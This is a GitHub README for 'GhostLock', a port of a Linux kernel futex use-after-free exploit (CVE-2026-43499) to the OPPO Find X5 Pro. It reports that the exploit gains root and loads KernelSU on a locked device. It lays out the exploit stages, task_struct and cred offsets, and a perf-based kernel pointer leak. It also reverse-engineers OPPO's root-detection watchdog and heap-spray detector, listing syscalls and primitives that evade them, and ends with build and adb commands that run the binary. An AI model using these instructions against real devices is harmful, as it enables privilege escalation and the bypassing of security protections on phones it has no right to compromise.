# GhostLock — OPPO Find X5 Pro (PFEM10)

**English** · [中文](README.zh-CN.md)

[![build](https://github.com/diyiqiuye/ghostlock-pfem10/actions/workflows/build.yml/badge.svg)](https://github.com/diyiqiuye/ghostlock-pfem10/actions/workflows/build.yml)

GhostLock (CVE-2026-43499) port for the OPPO Find X5 Pro on ColorOS 16. Reaches a `uid=0` child process and a loaded `kernelsu.ko`; the root process is intercepted.

## Vulnerability

**CVE-2026-43499** — futex PI use-after-free. `remove_waiter()` clears `current->pi_blocked_on` when `current` is the requeuer, on the `-EDEADLK` rollback path of `rt_mutex_start_proxy_lock()`.

`remove_waiter` @ `0xffffffc0081ed254` — pre-fix shape.

## Device

| | |
|---|---|
| Device | OPPO Find X5 Pro (PFEM10) |
| SoC | SM8450 / Adreno 730 |
| OS | ColorOS 16.0.3.520 (CN01) |
| Kernel | `5.10.236-android12-9-o-gaf2075ad2c06` |
| Bootloader | locked, green |
| VA_BITS | 39 — `KIMAGE_TEXT_BASE = 0xffffffc008000000` |

## Status

| Stage | |
|---|---|
| Compact waiter trigger (`CMP_REQUEUE_PI` → `EDEADLK`) | works |
| `task_struct` leak (perf) | works |
| PI write (8-byte; value = `0` or a valid kernel address) | works |
| `task+0x778` / `task+0x780` → `Uid=root` | works |
| `kernelsu.ko` loaded | works |
| Root process survives | no |
| Path A (UMH / `modprobe_path`) | `STATIC_USERMODEHELPER_PATH=""` |

## Offsets

`task_struct`

| Field | Offset |
|---|---|
| `real_cred` / `cred` | `0x778` / `0x780` |
| cached `syscallno` | `0xdf8` |
| cached `uid` / `euid` / `gid` / `egid` | `0xe00` / `0xe08` / `0xe10` / `0xe18` |

`thread_info`

| Field | Offset |
|---|---|
| `flags` | `0x0` |
| `addr_limit` | `0x8` |
| `ttbr0` | `0x10` |
| `preempt_count` | `0x18` |

`cred`

| Field | Offset | Field | Offset |
|---|---|---|---|
| `uid` | `0x4` | `cap_inheritable` | `0x28` |
| `gid` | `0x8` | `cap_permitted` | `0x30` |
| `suid` | `0xc` | `cap_effective` | `0x38` |
| `sgid` | `0x10` | `cap_bset` | `0x40` |
| `euid` | `0x14` | `cap_ambient` | `0x48` |
| `egid` | `0x18` | | |
| `fsuid` / `fsgid` | `0x1c` / `0x20` | | |

## Exploit Flow

```
LT#2        perf leak target task_struct → file
W7 stage 1  task+0x778 = init_cred alias        → "Uid=root"
W7 stage 2  task+0x780 = init_cred alias
W7 stage 3  zero-write init_cred+8
exec        memfd_exec("ksud late-load")        → kernelsu ... Live
```

perf leak: `PERF_TYPE_SOFTWARE` / `PERF_COUNT_SW_CPU_CLOCK`, `PERF_SAMPLE_REGS_INTR`, `exclude_user=1`.
Accept `[0xffffff8400000000, 0xffffff90000000)`, votes ≥ 15%.

## Watchdog — `oplus_security_guard.ko`

`sys_enter` cache:

```asm
ldrsw x8, [x1, #0x118]          ; regs->syscallno
mrs   x9, sp_el0                ; current
ldr   x10, [x9, #0x780]         ; cred
str   x8,  [x9, #0xdf8]
ldr   w8,  [x10, #4]    → str x8, [x9, #0xe00]   ; uid
ldr   w8,  [x10, #0x14] → str x8, [x9, #0xe08]   ; euid
ldr   w8,  [x10, #8]    → str x8, [x9, #0xe10]   ; gid
ldr   w8,  [x10, #0x18] → str x8, [x9, #0xe18]   ; egid
```

`sys_exit` check:

```asm
ldr   x0,  [x8, #0xe00]         ; cached uid
cbz   x0, #0x48c                ; cached uid == 0 → return
adrp  x9, #0 ; ldrb w9, [x9]    ; g_boot_state
tbnz  w9, #0, #0x48c            ; is_unlocked → return
ldr   x9,  [x8, #0x780]         ; cred
ldr   w3,  [x8, #0xdf8]         ; cached syscallno
cmp   x0, w10 ; b.hi #0x468     ; uid descending → kill path
                                ; euid / gid / egid, same shape
ldr   x9,  [x8, #8]             ; addr_limit
cmp   x9,  #0x8000000001
b.lo  #0x48c                    ; addr_limit != KERNEL_DS → return
sub   w9,  w3, #0x8f            ; syscallno - 143
cmp   w9,  #0x47
b.hi  #0x4a0                    ; outside 143..214 → kill
ldrsw x12, [x10, x9, lsl #2]    ; jmp table @ .rodata+0
br    x11
0x48c: ret
0x4a0: bl oplus_root_check_succ ; printk + kevent_send_to_user
       bl oplus_root_killed     ; printk + do_exit(SIGKILL)
```

`g_boot_state` — 1 byte `.data..ro_after_init`, set at module init from `verified_bootstate` via `strstr`. `is_unlocked()` = `LDRB` + `RET`.

Module VA writes fault (`CONFIG_STRICT_MODULE_RWX=y`) — use the physmap alias `0xffffff80…`.

Report payload: `$$sys_call_number@@%d`, `$$set_id_flag@@%d`, `$$addr_limit@@%lx`, `$$enforce@@%d`.

### Exempt syscalls — `.rodata+0`, indices 143–214

| 143 `setgid` | 144 `setreuid` | 145 `setuid` | 146 `setresuid` |
|---|---|---|---|
| 147 `getresuid` | 149 `getresgid` | 203 `getsockname` | 204 `getpeername` |
| 208 `getsockopt` | 210 `sendmsg` | 213 `brk` | 214 `munmap` |

Remaining 60 entries → report + kill.

## Heap-Spray Detector — `oplus_secure_harden.ko`

| kretprobe | Hooks | Filter |
|---|---|---|
| `socket_kretprobe` | `ip_setsockopt` | `regs[1]` ∈ {41, 42, 48} |
| `socket_ip6_kretprobe` | `do_ipv6_setsockopt` | `regs[1]` ∈ {41, 42} |
| `cpuinfo_kretprobe` | `cpuinfo_open` | — |
| `setxattr_kretprobe` | `setxattr` | — |
| `sepolicy_reload_kretprobe` | `spolicy_reload` | — |

```asm
ldr  w8, [x1, #8]       ; regs[1]
cmp  w8, #0x29          ; 41 IP_MSFILTER
b.eq #0xd58
cmp  w8, #0x30          ; 48 MCAST_MSFILTER
b.eq #0xd60
cmp  w8, #0x2a          ; 42 MCAST_JOIN_GROUP
b.ne #0xd68             ; else → return, no call
bl   oplus_heapspray_check
```

`entry_handler_setxattr` → `oplus_heapspray_check(7)`, `entry_handler_cpuinfo` → `(6)`, both unconditional.

`oplus_heapspray_check` — counters `heapspary_ip4` / `ip6` / `xttr` / `cpuinfo`, `ktime_get_real_ts64` delta, 7 report sites (`snprintf` + `printk` + `kevent_send_to_user`), gated on `verified_bootstate`.

### Avoidance

| Primitive | |
|---|---|
| `setsockopt` optname 46 `MCAST_JOIN_SOURCE_GROUP` | not filtered |
| `setsockopt` level `SOL_IPV6` (41) | not filtered if filter reads `level` |
| `setxattr` | always counted |
| `/proc/cpuinfo` | always counted |
| `socket()` / `socketpair()` | not hooked |
| `sendmsg`, `pipe`, `memfd`, `add_key`, `io_uring`, mmap | not hooked |

## Config

```
CONFIG_CFI_CLANG=y
CONFIG_PTR_AUTH=y
CONFIG_SHADOW_CALL_STACK=y
CONFIG_STRICT_MODULE_RWX=y
CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""
CONFIG_SET_FS=y
CONFIG_RANDOMIZE_BASE=y
CONFIG_RANDOMIZE_MODULE_REGION_FULL=n
CONFIG_UNMAP_KERNEL_AT_EL0=y
CONFIG_ARM64_VA_BITS=39
CONFIG_ARM64_SW_TTBR0_PAN=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y
CONFIG_RANDOM_KMALLOC_CACHES=n
CONFIG_USER_NS=n
CONFIG_NF_TABLES=n
CONFIG_SYSVIPC=n
CONFIG_ANDROID_BINDER_IPC=y
CONFIG_KASAN=y
```

`perf_event_paranoid = -1`

## Build

NDK **r28c**. `-O1` / API **26** / `-D__ARM=1` are **fixed** — they keep the reclaim stack-frame geometry (`delta=0` calibration). Changing any of them requires re-calibrating on device.

```bash
export ANDROID_NDK_HOME=/path/to/android-ndk-r28c
make                      # → exploit_guard
./build.sh                # same, with NDK auto-detection
```

Manual:

```bash
"$ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android26-clang" \
  -D__ARM=1 -O1 -Wall -Wextra -pthread -Isrc/core -Isrc/devices/pfem10 \
  -o exploit_guard src/core/exploit.c
```

CI builds on every push (`.github/workflows/build.yml`, Ubuntu + NDK r28c, artifact `exploit_guard`).

## Setup

```bash
adb push exploit_guard /data/local/tmp/e
adb shell chmod 755 /data/local/tmp/e
adb shell /data/local/tmp/e
```

## Files

```
modules/                  kernelsu.ko (KMI android12-5.10)  ksud  libkernelsu.so
src/core/                 exploit.c  payload.c  payload.h  fdset_map.h
src/devices/pfem10/       pfem10_target.h
tools/                    kdis.py  kdis_ko.py  find_task_off.py  slide_resolve.py
artifacts/                guard_disasm.txt  guard_exempt_table.txt  harden_disasm.txt
Makefile  build.sh        exploit build (-O1, API 26, NDK r28c)
.github/workflows/        build.yml — cloud build + artifact
```

`tools/kdis_ko.py` — RELA matched by `sh_info`; on these builds `.text` relocs live in `.rela.text.<func>`, so name-based lookup returns nothing.

## Related

| Project | |
|---|---|
| [JoinChang/ghostlock-oneplus](https://github.com/JoinChang/ghostlock-oneplus) | reference implementation; 5.10 compact waiter |
| [NebuSec CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) | original GhostLock research |

## License

GPL-3.0 — see [LICENSE](LICENSE).
